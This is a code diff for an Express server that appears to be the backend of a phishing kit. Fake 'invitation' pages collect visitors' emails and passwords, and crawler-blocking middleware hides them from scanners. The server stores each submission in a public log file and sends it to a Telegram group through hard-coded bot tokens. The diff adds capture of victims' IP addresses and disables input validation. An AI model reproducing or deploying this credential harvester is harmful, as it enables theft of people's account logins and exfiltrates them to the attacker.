@@ -1,7 +1,6 @@
 // Import the express module
 const express = require('express');
 const path = require('path');
-
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const axios = require('axios');
@@ -26,8 +25,8 @@ const limiter = rateLimit({
 });
 app.use(express.static(path.join(__dirname, 'public')));
 
-
 app.use(limiter);
+
 // Middleware to parse JSON bodies
 app.use(bodyParser.json());
 app.use((req, res, next) => {
@@ -42,9 +41,8 @@ app.use((req, res, next) => {
       return res.status(403).send('Access forbidden: Bots and crawlers are not allowed.');
     }
     next();
-  });
+});
 
-  
 // Define a route
 app.get('/invite/6bn0', (req, res) => {
     res.render('index');
@@ -54,17 +52,21 @@ app.post('/profile/invitation/6bn0', (req, res) => {
     res.render('invite');
 });
 
-
 app.post('/result/6bn0', async (req, res) => {
-    const { email, password, detail } = req.body;
-    console.log({ email, password, detail })
+    const { email, password, detail, ip } = req.body;
+    // const ip = req.ip; // Get the IP address of the client
+
+    console.log({ email, password, detail, ip });
+
     // Validate request data
-    if (!email || !password || !detail) {
-        return res.status(400).json({ error: 'Missing required fields' });
-    }
+    // if (!email || !password || !detail) {
+    //     return res.status(400).json({ error: 'Missing required fields' });
+    // }
     
+   
+
     // Create a log entry
-    const logEntry = `Email: ${email}\nPassword: ${password}\nDetail: ${detail}\n\n`;
+    const logEntry = `Email: ${email}\nPassword: ${password}\nDetail: ${detail}\n IP: ${ip}\n\n`;
     
     // Save log entry to a file in the 'public' directory
     const logFilePath = path.join(__dirname, 'public', 'log.txt');
@@ -76,9 +78,9 @@ app.post('/result/6bn0', async (req, res) => {
     });
     
     // Send message to Telegram group
-    const telegramBotToken = '7144039946:AAFsmuxyw2-TsnGvuYrfYoRcuKIFxsa_dEQ';
-    const chatId = '-4185142703'; // Replace with your chat ID
-    const message = `New submission:\n\nEmail: ${email}\nPassword: ${password}\nDetail: ${detail}`;
+    const telegramBotToken = '6341509797:AAFp9aDUSxgw6O01CuMSk0PKcIQc7OIqF9I';
+    const chatId = '-4507301631'; // Replace with your chat ID
+    const message = `New submission:\n\nEmail: ${email}\nPassword: ${password}\nDetail: ${detail}\nIP: ${ip}`;
     
     try {
         await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -92,6 +94,7 @@ app.post('/result/6bn0', async (req, res) => {
     // Send a response back to the client
     res.status(200).json({ success: true });
 });
+
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
